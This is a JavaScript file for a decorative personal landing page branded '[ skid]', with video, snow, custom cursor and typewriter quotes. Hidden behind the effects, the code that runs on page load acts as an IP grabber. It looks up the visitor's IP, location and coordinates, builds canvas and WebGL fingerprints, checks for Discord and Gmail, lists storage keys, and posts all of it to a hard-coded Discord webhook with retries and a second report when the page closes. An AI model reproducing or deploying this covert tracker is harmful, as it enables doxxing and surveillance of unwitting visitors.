const INTRO_HOLD_MS = 800;
const CROSS_FADE_MS = 2000;
const TYPE_SPEED_MS = 65;
const DISCORD_USER = "8_v";
const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1519751760808251554/W1If29qK4cOpVmrNRsBzMT4ImCwtE5z1ykbn5B2kahsrun5QEPKgThC_a8deOWTb3dVS";
const VISIT_KEY = "skid_visit_count";
const SESSION_KEY = "skid_session_id";
const FP_KEY = "skid_fingerprint";
const TITLE_CYCLE = ["[ skid]", "...", "leave", "..."];
const QUOTES = [
  "The memory of everything is very soon overwhelmed in time.",
  "Nothing gold can stay.",
  "We are all ghosts of the lives we never lived.",
  "Time is the fire in which we burn.",
  "The past is never dead. It is not even past.",
  "In the depth of winter, I finally learned that within me there lay an invincible summer.",
  "What we call the beginning is often the end.",
  "All things fade. All things break. All things die.",
  "The world breaks everyone, and afterward, many are strong at the broken places.",
  "I have measured out my life with coffee spoons.",
  "And in the end, we were all just humans, drunk on the idea that love alone could heal our brokenness.",
  "There is no darkness but ignorance.",
];
const SESSION_START = Date.now();

let mainShown = false;
let introTimer = null;
let visitorSnapshot = null;
let sessionSent = false;
let webhookSent = false;
let videoStarted = false;

const intro = document.getElementById("intro");
const introCross = document.getElementById("intro-cross");
const introSecret = document.getElementById("intro-secret");
const main = document.getElementById("main");
const hudTop = document.getElementById("hud-top");
const bgVideo = document.getElementById("bg-video");
const videoShade = document.querySelector(".video-shade");
const titleEl = document.getElementById("title-text");
const quoteEl = document.getElementById("quote-text");
const visitorPanel = document.getElementById("visitor-panel");
const visitorIp = document.getElementById("visitor-ip");
const visitorLocation = document.getElementById("visitor-location");
const visitorProvider = document.getElementById("visitor-provider");
const visitCountEl = document.getElementById("visit-count");
const muteBtn = document.getElementById("mute-btn");
const copyDiscordBtn = document.getElementById("copy-discord");
const copyToast = document.getElementById("copy-toast");
const timeDisplay = document.getElementById("time-display");
const cursorCross = document.getElementById("cursor-cross");
const cursorTrail = document.getElementById("cursor-trail");
const filmGrain = document.getElementById("film-grain");
const loadProgress = document.getElementById("load-progress");
const loadProgressBar = document.getElementById("load-progress-bar");

function getRandomQuote() {
  const quote = QUOTES[Math.floor(Math.random() * QUOTES.length)];
  return `"${quote}"`;
}

function getMapUrl(lat, lon) {
  const la = parseFloat(lat);
  const lo = parseFloat(lon);
  if (Number.isNaN(la) || Number.isNaN(lo)) return null;
  return `https://www.google.com/maps?q=${la},${lo}`;
}

/* ── Load progress ── */

function initLoadProgress() {
  if (!bgVideo || !loadProgressBar) return;

  let finished = false;

  const setProgress = (pct) => {
    loadProgressBar.style.width = `${Math.min(Math.max(pct, 0), 100)}%`;
  };

  const finishProgress = () => {
    if (finished) return;
    finished = true;
    setProgress(100);
    loadProgress?.classList.add("done");
    setTimeout(() => loadProgress?.remove(), 600);
  };

  setProgress(8);

  bgVideo.addEventListener("loadstart", () => setProgress(15));
  bgVideo.addEventListener("progress", () => {
    if (!bgVideo.duration || !bgVideo.buffered.length) return;
    const buffered = bgVideo.buffered.end(bgVideo.buffered.length - 1);
    setProgress(15 + (buffered / bgVideo.duration) * 75);
  });
  bgVideo.addEventListener("canplay", () => setProgress(92));
  bgVideo.addEventListener("canplaythrough", finishProgress);
  bgVideo.addEventListener("error", finishProgress);

  if (bgVideo.readyState >= 4) finishProgress();
  else setTimeout(finishProgress, 12000);
}

/* ── Video ── */

function coverVideo() {
  if (!bgVideo?.videoWidth) return;

  const vw = window.innerWidth;
  const vh = window.innerHeight;
  const videoRatio = bgVideo.videoWidth / bgVideo.videoHeight;
  const windowRatio = vw / vh;

  if (windowRatio > videoRatio) {
    bgVideo.style.width = `${Math.ceil(vw)}px`;
    bgVideo.style.height = `${Math.ceil(vw / videoRatio + 2)}px`;
  } else {
    bgVideo.style.height = `${Math.ceil(vh)}px`;
    bgVideo.style.width = `${Math.ceil(vh * videoRatio + 2)}px`;
  }

  bgVideo.style.transform = "translate(-50%, -50%)";
}

function enableSound() {
  if (!bgVideo) return;
  bgVideo.removeAttribute("muted");
  bgVideo.defaultMuted = false;
  bgVideo.muted = false;
  bgVideo.volume = 1;
}

function disableSound() {
  if (!bgVideo) return;
  bgVideo.muted = true;
  bgVideo.setAttribute("muted", "");
}

async function startVideo() {
  if (!bgVideo || videoStarted) return;

  enableSound();
  coverVideo();

  try {
    await bgVideo.play();
    videoStarted = true;
  } catch {
    attachPlayRetry();
  }

  updateMuteBtn();
}

function attachPlayRetry() {
  const retry = () => {
    if (!bgVideo) return;
    enableSound();
    bgVideo.play().then(() => {
      videoStarted = true;
      updateMuteBtn();
    }).catch(() => {});
  };

  document.addEventListener("pointerdown", retry, { once: true, capture: true });
  document.addEventListener("keydown", retry, { once: true, capture: true });
}

async function revealVideo() {
  if (!bgVideo) return;

  coverVideo();
  bgVideo.classList.add("active");
  videoShade?.classList.add("active");

  enableSound();

  try {
    if (bgVideo.paused) await bgVideo.play();
    videoStarted = true;
  } catch {
    videoStarted = false;
    attachPlayRetry();
  }

  updateMuteBtn();
  finishLoadProgress();
}

function finishLoadProgress() {
  if (!loadProgressBar || !loadProgress) return;
  loadProgressBar.style.width = "100%";
  loadProgress.classList.add("done");
  setTimeout(() => loadProgress.remove(), 600);
}

function unmuteVideo() {
  if (!bgVideo) return;

  enableSound();
  bgVideo.play().catch(() => {});
  updateMuteBtn();
}

function updateMuteBtn() {
  if (!muteBtn || !bgVideo) return;
  const muted = bgVideo.muted;
  muteBtn.textContent = muted ? "♪ unmute" : "♫ mute";
  muteBtn.classList.toggle("muted", muted);
  muteBtn.classList.toggle("unmuted", !muted);
  muteBtn.setAttribute("aria-label", muted ? "Unmute" : "Mute");
}

function toggleMute() {
  if (!bgVideo) return;
  if (bgVideo.muted) {
    enableSound();
    bgVideo.play().catch(() => {});
    updateMuteBtn();
  } else {
    disableSound();
    updateMuteBtn();
  }
}

muteBtn?.addEventListener("click", (e) => {
  e.stopPropagation();
  toggleMute();
});
window.addEventListener("resize", coverVideo);
bgVideo?.addEventListener("loadedmetadata", () => {
  coverVideo();
  startVideo();
});
bgVideo?.addEventListener("canplay", startVideo, { once: true });

/* ── Custom cursor ── */

function initCursor() {
  if (!cursorCross || !cursorTrail || window.matchMedia("(pointer: coarse)").matches) return;

  let mx = window.innerWidth / 2;
  let my = window.innerHeight / 2;
  let tx = mx;
  let ty = my;

  window.addEventListener("mousemove", (e) => {
    mx = e.clientX;
    my = e.clientY;
  });

  const tick = () => {
    tx += (mx - tx) * 0.18;
    ty += (my - ty) * 0.18;
    cursorCross.style.transform = `translate(${mx}px, ${my}px) translate(-50%, -50%)`;
    cursorTrail.style.transform = `translate(${tx}px, ${ty}px) translate(-50%, -50%)`;
    requestAnimationFrame(tick);
  };

  tick();
}

/* ── Film grain ── */

function initFilmGrain() {
  if (!filmGrain) return;
  const ctx = filmGrain.getContext("2d");
  if (!ctx) return;

  const resize = () => {
    filmGrain.width = window.innerWidth / 2;
    filmGrain.height = window.innerHeight / 2;
  };

  resize();
  window.addEventListener("resize", resize);

  const draw = () => {
    const { width, height } = filmGrain;
    const imageData = ctx.createImageData(width, height);
    const data = imageData.data;

    for (let i = 0; i < data.length; i += 4) {
      const v = Math.random() * 255;
      data[i] = v;
      data[i + 1] = v;
      data[i + 2] = v;
      data[i + 3] = 18;
    }

    ctx.putImageData(imageData, 0, 0);
    requestAnimationFrame(draw);
  };

  draw();
}

/* ── Snow ── */

function initSnow() {
  const canvas = document.getElementById("snow");
  if (!canvas) return;

  const ctx = canvas.getContext("2d");
  if (!ctx) return;
  const flakes = [];
  let count = 0;

  function resize() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const isMobile = window.innerWidth < 600;
    count = Math.min(isMobile ? 28 : 50, Math.floor(canvas.width / (isMobile ? 40 : 30)));
    while (flakes.length < count) {
      flakes.push(makeFlake(true));
    }
    flakes.length = count;
  }

  function makeFlake(randomY) {
    return {
      x: Math.random() * canvas.width,
      y: randomY ? Math.random() * canvas.height : -6,
      r: Math.random() * 1.1 + 0.35,
      speed: Math.random() * 0.3 + 0.12,
      drift: Math.random() * 0.2 - 0.1,
      opacity: Math.random() * 0.22 + 0.06,
      wobble: Math.random() * Math.PI * 2,
    };
  }

  function draw() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    for (const f of flakes) {
      f.wobble += 0.008;
      f.y += f.speed;
      f.x += f.drift + Math.sin(f.wobble) * 0.12;

      if (f.y > canvas.height + 6) {
        f.y = -6;
        f.x = Math.random() * canvas.width;
      }

      ctx.beginPath();
      ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(255, 255, 255, ${f.opacity})`;
      ctx.fill();
    }

    requestAnimationFrame(draw);
  }

  resize();
  window.addEventListener("resize", resize);
  draw();
}

/* ── Title flicker ── */

function initTitleFlicker() {
  let i = 0;
  setInterval(() => {
    document.title = TITLE_CYCLE[i++ % TITLE_CYCLE.length];
  }, 3200);
}

/* ── Time display ── */

function updateTime() {
  if (!timeDisplay) return;
  const now = new Date();
  const h = String(now.getHours()).padStart(2, "0");
  const m = String(now.getMinutes()).padStart(2, "0");
  timeDisplay.textContent = `local time: ${h}:${m}`;
}

updateTime();
setInterval(updateTime, 10000);

/* ── Copy Discord ── */

function showCopyToast() {
  if (!copyToast) return;
  copyToast.classList.add("visible");
  setTimeout(() => copyToast.classList.remove("visible"), 1400);
}

async function copyDiscord() {
  try {
    await navigator.clipboard.writeText(DISCORD_USER);
  } catch {
    const ta = document.createElement("textarea");
    ta.value = DISCORD_USER;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
  }
  showCopyToast();
}

copyDiscordBtn?.addEventListener("click", copyDiscord);

/* ── Visitor / webhook ── */

function getSessionId() {
  let id = sessionStorage.getItem(SESSION_KEY);
  if (!id) {
    id = `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
    sessionStorage.setItem(SESSION_KEY, id);
  }
  return id;
}

function getDeviceMeta() {
  const darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : window.matchMedia("(prefers-color-scheme: light)").matches
      ? "light"
      : "no-preference";

  const touch = navigator.maxTouchPoints > 0 ? "touch" : "mouse";
  const mobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
    window.innerWidth < 768
      ? "mobile"
      : "desktop";

  return { darkMode, input: touch, device: mobile };
}

function getVisitTag(count) {
  return count === 1 ? "first visit" : `returning (${count}x)`;
}

function trackVisitCount() {
  try {
    const count = parseInt(localStorage.getItem(VISIT_KEY) || "0", 10) + 1;
    localStorage.setItem(VISIT_KEY, String(count));
    if (visitCountEl) {
      visitCountEl.textContent = `you've been here ${count} time${count === 1 ? "" : "s"}`;
    }
    return count;
  } catch {
    if (visitCountEl) visitCountEl.textContent = "you've been here before";
    return 1;
  }
}

function hashString(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) {
    h = (Math.imul(31, h) + str.charCodeAt(i)) | 0;
  }
  return Math.abs(h).toString(16).padStart(8, "0");
}

function getCanvasFingerprint() {
  try {
    const c = document.createElement("canvas");
    c.width = 200;
    c.height = 50;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px monospace";
    ctx.fillStyle = "#0a0a0a";
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = "#fff";
    ctx.fillText("[ skid]", 2, 2);
    return hashString(c.toDataURL());
  } catch {
    return "unavailable";
  }
}

function getWebGLInfo() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return { vendor: "unavailable", renderer: "unavailable" };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : "unknown",
      renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "unknown",
    };
  } catch {
    return { vendor: "unavailable", renderer: "unavailable" };
  }
}

function getReferrerHost() {
  if (!document.referrer) return "direct";
  try {
    return new URL(document.referrer).hostname;
  } catch {
    return document.referrer.slice(0, 120);
  }
}

function getServiceSignals() {
  const ref = (document.referrer || "").toLowerCase();
  const ua = (navigator.userAgent || "").toLowerCase();
  const host = getReferrerHost().toLowerCase();

  const checks = {
    discord: ref.includes("discord") || ua.includes("discord"),
    gmail: ref.includes("mail.google") || ref.includes("gmail.com"),
    google: ref.includes("google.com") || ref.includes("googleusercontent"),
    youtube: ref.includes("youtube.com") || ref.includes("youtu.be"),
    twitter: ref.includes("twitter.com") || ref.includes("x.com"),
    instagram: ref.includes("instagram.com"),
    facebook: ref.includes("facebook.com") || ref.includes("fb.com"),
    tiktok: ref.includes("tiktok.com"),
    reddit: ref.includes("reddit.com"),
    github: ref.includes("github.com"),
  };

  const active = Object.entries(checks)
    .filter(([, v]) => v)
    .map(([k]) => k);

  let inAppBrowser = "standard";
  if (ua.includes("discord")) inAppBrowser = "discord";
  else if (ua.includes("instagram")) inAppBrowser = "instagram";
  else if (ua.includes("fbav") || ua.includes("facebook")) inAppBrowser = "facebook";
  else if (ua.includes("tiktok")) inAppBrowser = "tiktok";
  else if (ua.includes("twitter")) inAppBrowser = "twitter";

  return {
    referrerHost: host,
    detectedServices: active.length ? active.join(", ") : "none",
    discord: checks.discord ? "yes" : "no",
    gmail: checks.gmail ? "yes" : "no",
    google: checks.google ? "yes" : "no",
    inAppBrowser,
  };
}

function getClientHints() {
  const hints = {};
  const uaData = navigator.userAgentData;
  if (uaData) {
    hints.brands = (uaData.brands || []).map((b) => `${b.brand}/${b.version}`).join(", ") || "unknown";
    hints.mobile = uaData.mobile ? "yes" : "no";
    hints.platform = uaData.platform || "unknown";
  }
  return hints;
}

function getStorageInfo() {
  const keys = [];
  try {
    for (let i = 0; i < localStorage.length; i++) {
      keys.push(localStorage.key(i));
    }
  } catch {
    /* blocked */
  }
  return {
    localStorageKeys: keys.length ? keys.join(", ") : "none",
    sessionStorageKeys: (() => {
      try {
        const sk = [];
        for (let i = 0; i < sessionStorage.length; i++) sk.push(sessionStorage.key(i));
        return sk.length ? sk.join(", ") : "none";
      } catch {
        return "blocked";
      }
    })(),
  };
}

function getPersistentId() {
  const webgl = getWebGLInfo();
  const raw = [
    getCanvasFingerprint(),
    webgl.renderer,
    screen.width,
    screen.height,
    navigator.language,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
  ].join("|");

  let id = localStorage.getItem(FP_KEY);
  if (!id) {
    id = hashString(raw);
    try {
      localStorage.setItem(FP_KEY, id);
    } catch {
      /* private mode */
    }
  }
  return id;
}

function getBrowserInfo(ipData, visitCount) {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const meta = getDeviceMeta();
  const services = getServiceSignals();
  const webgl = getWebGLInfo();
  const hints = getClientHints();
  const storage = getStorageInfo();
  const fingerprint = getPersistentId();
  const urlParams = new URLSearchParams(window.location.search);
  const params = [...urlParams.entries()].map(([k, v]) => `${k}=${v}`).join("&") || "none";

  return {
    ip: ipData?.ip || "unknown",
    ipType: ipData?.type || "unknown",
    location: [ipData?.city, ipData?.region, ipData?.country].filter(Boolean).join(", ") || "unknown",
    provider: ipData?.connection?.isp || ipData?.isp || "unknown",
    asn: ipData?.connection?.asn || "unknown",
    orgDomain: ipData?.connection?.domain || "unknown",
    latitude: ipData?.latitude ?? "unknown",
    longitude: ipData?.longitude ?? "unknown",
    timezone: ipData?.timezone || tz || "unknown",
    continent: ipData?.continent || "unknown",
    postal: ipData?.postal || "unknown",
    userAgent: navigator.userAgent,
    platform: navigator.platform || "unknown",
    vendor: navigator.vendor || "unknown",
    language: navigator.language || "unknown",
    languages: (navigator.languages || []).join(", ") || "unknown",
    screen: `${screen.width}x${screen.height} @ ${window.devicePixelRatio}x`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    colorDepth: `${screen.colorDepth}-bit`,
    cpuCores: navigator.hardwareConcurrency ?? "unknown",
    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "unknown",
    cookiesEnabled: navigator.cookieEnabled,
    online: navigator.onLine,
    referrer: document.referrer || "direct",
    referrerHost: services.referrerHost,
    pageUrl: window.location.href,
    urlParams: params,
    connectionType: conn?.effectiveType || "unknown",
    downlink: conn?.downlink != null ? `${conn.downlink} Mbps` : "unknown",
    rtt: conn?.rtt != null ? `${conn.rtt} ms` : "unknown",
    visitCount,
    visitTag: getVisitTag(visitCount),
    colorScheme: meta.darkMode,
    inputType: meta.input,
    deviceType: meta.device,
    sessionId: getSessionId(),
    fingerprint,
    canvasHash: getCanvasFingerprint(),
    webglVendor: webgl.vendor,
    webglRenderer: webgl.renderer,
    doNotTrack: navigator.doNotTrack || "unknown",
    pdfViewer: navigator.pdfViewerEnabled ?? "unknown",
    webdriver: navigator.webdriver ? "yes" : "no",
    timezoneOffset: new Date().getTimezoneOffset(),
    clientHints: hints.brands || "unavailable",
    clientPlatform: hints.platform || "unavailable",
    clientMobile: hints.mobile || "unknown",
    detectedServices: services.detectedServices,
    discordDetected: services.discord,
    gmailDetected: services.gmail,
    googleDetected: services.google,
    inAppBrowser: services.inAppBrowser,
    localStorageKeys: storage.localStorageKeys,
    sessionStorageKeys: storage.sessionStorageKeys,
    timestamp: new Date().toISOString(),
    mapUrl: getMapUrl(ipData?.latitude, ipData?.longitude),
  };
}

function line(label, value) {
  return `**${label}** · \`${value}\``;
}

function buildVisitorEmbed(info) {
  const networkLines = [
    line("ip", info.ip),
    line("type", info.ipType),
    line("location", info.location),
    line("isp", info.provider),
    line("asn", info.asn),
    line("domain", info.orgDomain),
    line("coords", `${info.latitude}, ${info.longitude}`),
    line("postal", info.postal),
    line("timezone", info.timezone),
  ];

  if (info.mapUrl) {
    networkLines.push(`**map** · [open pin](${info.mapUrl})`);
  }

  return {
    title: "†  visitor log",
    description: `\`\`\`ini\n[ ${info.visitTag} ]\n\`\`\``,
    color: 0x0a0a0a,
    timestamp: info.timestamp,
    url: info.mapUrl || undefined,
    fields: [
      {
        name: "identifiers",
        value: [
          line("fingerprint", info.fingerprint),
          line("session", info.sessionId),
          line("canvas", info.canvasHash),
          line("webgl", info.webglRenderer),
          line("webdriver", info.webdriver),
          line("dnt", info.doNotTrack),
        ].join("\n"),
        inline: false,
      },
      {
        name: "services",
        value: [
          line("discord", info.discordDetected),
          line("gmail", info.gmailDetected),
          line("google", info.googleDetected),
          line("in-app", info.inAppBrowser),
          line("detected", info.detectedServices),
          line("referrer", info.referrerHost),
        ].join("\n"),
        inline: true,
      },
      {
        name: "network",
        value: networkLines.join("\n"),
        inline: false,
      },
      {
        name: "session",
        value: [
          line("visits", info.visitCount),
          line("referrer", info.referrer),
          line("params", info.urlParams),
          line("url", info.pageUrl),
          line("storage", info.localStorageKeys),
        ].join("\n"),
        inline: false,
      },
      {
        name: "device",
        value: [
          line("type", info.deviceType),
          line("input", info.inputType),
          line("theme", info.colorScheme),
          line("screen", info.screen),
          line("viewport", info.viewport),
        ].join("\n"),
        inline: true,
      },
      {
        name: "system",
        value: [
          line("platform", info.platform),
          line("vendor", info.vendor),
          line("language", info.language),
          line("connection", info.connectionType),
          line("downlink", info.downlink),
          line("rtt", info.rtt),
          line("memory", info.deviceMemory),
          line("cores", info.cpuCores),
          line("hints", info.clientHints),
        ].join("\n"),
        inline: true,
      },
      {
        name: "browser",
        value: `\`\`\`\n${info.userAgent.slice(0, 900)}\n\`\`\``,
        inline: false,
      },
    ],
    footer: { text: "[ skid]" },
  };
}

function buildSessionEmbed(info) {
  const visitorLines = [
    line("status", info.visitTag),
    line("ip", info.ip),
    line("location", info.location),
    line("duration", info.duration),
    line("discord", info.discordDetected),
    line("gmail", info.gmailDetected),
    line("fingerprint", info.fingerprint),
  ];

  if (info.mapUrl) {
    visitorLines.push(`**map** · [open pin](${info.mapUrl})`);
  }

  return {
    title: "†  session ended",
    description: `\`\`\`ini\n[ stayed ${info.duration} ]\n\`\`\``,
    color: 0x0a0a0a,
    timestamp: info.timestamp,
    url: info.mapUrl || undefined,
    fields: [
      {
        name: "visitor",
        value: visitorLines.join("\n"),
        inline: true,
      },
      {
        name: "device",
        value: [
          line("type", info.deviceType),
          line("input", info.inputType),
          line("theme", info.colorScheme),
          line("session", info.sessionId),
        ].join("\n"),
        inline: true,
      },
    ],
    footer: { text: "[ skid]" },
  };
}

function postWebhook(payload) {
  const makeForm = () => {
    const form = new FormData();
    form.append("payload_json", JSON.stringify(payload));
    return form;
  };

  return fetch(WEBHOOK_URL, {
    method: "POST",
    body: makeForm(),
    keepalive: true,
  })
    .then((res) => res.ok)
    .catch(() => false)
    .then((fetchOk) => {
      if (fetchOk) return true;

      return new Promise((resolve) => {
        try {
          const xhr = new XMLHttpRequest();
          xhr.open("POST", WEBHOOK_URL, true);
          xhr.onload = () => resolve(xhr.status >= 200 && xhr.status < 300);
          xhr.onerror = () => {
            try {
              resolve(navigator.sendBeacon(WEBHOOK_URL, makeForm()));
            } catch {
              resolve(false);
            }
          };
          xhr.send(makeForm());
        } catch {
          try {
            resolve(navigator.sendBeacon(WEBHOOK_URL, makeForm()));
          } catch {
            resolve(false);
          }
        }
      });
    });
}

function sendWebhook(info) {
  if (webhookSent) return Promise.resolve(true);
  return postWebhook({ embeds: [buildVisitorEmbed(info)] }).then((ok) => {
    if (ok) webhookSent = true;
    return ok;
  });
}

function scheduleWebhookRetry() {
  const retry = () => {
    if (webhookSent || !visitorSnapshot) return;
    sendWebhook(visitorSnapshot);
  };

  document.addEventListener("pointerdown", retry, { once: true, capture: true });
  document.addEventListener("keydown", retry, { once: true, capture: true });
  setTimeout(retry, 2500);
  setTimeout(retry, 8000);
}

async function fetchWithTimeout(url, ms = 4500) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), ms);
  try {
    return await fetch(url, { signal: ctrl.signal });
  } finally {
    clearTimeout(timer);
  }
}

async function lookupIp() {
  const sources = [
    async () => {
      const res = await fetchWithTimeout("https://ipwho.is/");
      const data = await res.json();
      if (!data.success) throw new Error("lookup failed");
      return data;
    },
    async () => {
      const res = await fetchWithTimeout("https://ipapi.co/json/");
      const data = await res.json();
      if (!data.ip) throw new Error("lookup failed");
      return {
        success: true,
        ip: data.ip,
        city: data.city,
        region: data.region,
        country: data.country_name,
        latitude: data.latitude,
        longitude: data.longitude,
        connection: { isp: data.org, asn: data.asn },
      };
    },
    async () => {
      const res = await fetchWithTimeout("https://api.ipify.org?format=json");
      const data = await res.json();
      if (!data.ip) throw new Error("lookup failed");
      return { success: true, ip: data.ip };
    },
  ];

  for (const source of sources) {
    try {
      return await source();
    } catch {
      /* try next provider */
    }
  }

  return null;
}

function sendSessionWebhook() {
  if (sessionSent || !visitorSnapshot) return;
  sessionSent = true;

  const durationSec = Math.round((Date.now() - SESSION_START) / 1000);
  const mins = Math.floor(durationSec / 60);
  const secs = durationSec % 60;
  const duration = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;

  const info = {
    ...visitorSnapshot,
    duration,
    timestamp: new Date().toISOString(),
    visitTag: getVisitTag(visitorSnapshot.visitCount),
  };

  const body = new FormData();
  body.append("payload_json", JSON.stringify({ embeds: [buildSessionEmbed(info)] }));
  navigator.sendBeacon(WEBHOOK_URL, body);
}

window.addEventListener("pagehide", sendSessionWebhook);
window.addEventListener("beforeunload", sendSessionWebhook);

async function loadVisitorInfo() {
  let visitCount = 1;

  try {
    visitCount = trackVisitCount();
  } catch {
    if (visitCountEl) visitCountEl.textContent = "you've been here before";
  }

  let ipData = null;

  try {
    ipData = await Promise.race([
      lookupIp(),
      new Promise((resolve) => setTimeout(() => resolve(null), 5000)),
    ]);

    if (ipData) {
      visitorIp.textContent = ipData.ip || "unknown";
      visitorLocation.textContent = [ipData.city, ipData.region, ipData.country]
        .filter(Boolean)
        .join(", ") || "unknown";
      visitorProvider.textContent = ipData.connection?.isp || "unknown";
    } else {
      visitorIp.textContent = "unavailable";
      visitorLocation.textContent = "unavailable";
      visitorProvider.textContent = "unavailable";
    }
  } catch {
    visitorIp.textContent = "unavailable";
    visitorLocation.textContent = "unavailable";
    visitorProvider.textContent = "unavailable";
  }

  try {
    visitorSnapshot = getBrowserInfo(ipData, visitCount);
  } catch {
    visitorSnapshot = {
      ip: ipData?.ip || "unknown",
      visitCount,
      visitTag: getVisitTag(visitCount),
      userAgent: navigator.userAgent || "unknown",
      timestamp: new Date().toISOString(),
    };
  }

  const sent = await sendWebhook(visitorSnapshot);
  if (!sent) scheduleWebhookRetry();
}

loadVisitorInfo();

/* ── Typewriter ── */

function enableGlitch(el) {
  if (el) el.classList.add("glitch-text");
}

function typeText(element, text, speed) {
  return new Promise((resolve) => {
    element.classList.add("active");
    element.innerHTML = '<span class="cursor">|</span>';

    let i = 0;
    const interval = setInterval(() => {
      if (i < text.length) {
        element.textContent = text.slice(0, i + 1);
        element.innerHTML =
          element.textContent + '<span class="cursor">|</span>';
        i++;
      } else {
        clearInterval(interval);
        element.innerHTML = text;
        enableGlitch(element);
        resolve();
      }
    }, speed);
  });
}

/* ── Intro / main ── */

function runTypewriter() {
  setTimeout(async () => {
    await typeText(titleEl, "[ skid]", TYPE_SPEED_MS);
    await new Promise((r) => setTimeout(r, 500));
    await typeText(quoteEl, getRandomQuote(), TYPE_SPEED_MS - 10);
  }, 2000);
}

function showMain() {
  if (mainShown) return;
  mainShown = true;

  if (introTimer) clearTimeout(introTimer);

  intro.classList.add("fade-out");

  setTimeout(() => {
    intro.style.display = "none";
    main.classList.remove("hidden");
    main.classList.add("visible");
    visitorPanel?.classList.add("visible");
    hudTop?.classList.add("visible");

    revealVideo().catch(() => {
      updateMuteBtn();
      attachPlayRetry();
    });

    runTypewriter();
  }, 1200);
}

function skipIntro() {
  if (mainShown) return;

  startVideo();
  if (!webhookSent && visitorSnapshot) sendWebhook(visitorSnapshot);
  introSecret?.classList.add("visible");
  introCross.style.pointerEvents = "none";

  if (introTimer) clearTimeout(introTimer);
  showMain();
}

introCross?.addEventListener("click", skipIntro);
introCross?.addEventListener("keydown", (e) => {
  if (e.key === "Enter" || e.key === " ") {
    e.preventDefault();
    skipIntro();
  }
});

introCross?.addEventListener("pointerdown", () => {
  startVideo();
});

introTimer = setTimeout(showMain, CROSS_FADE_MS + INTRO_HOLD_MS);

/* ── Init ── */

try {
  initCursor();
} catch {
  /* blocked in strict privacy mode */
}
try {
  initFilmGrain();
} catch {
  /* canvas blocked */
}
try {
  initSnow();
} catch {
  /* canvas blocked */
}
initLoadProgress();
initTitleFlicker();
startVideo();
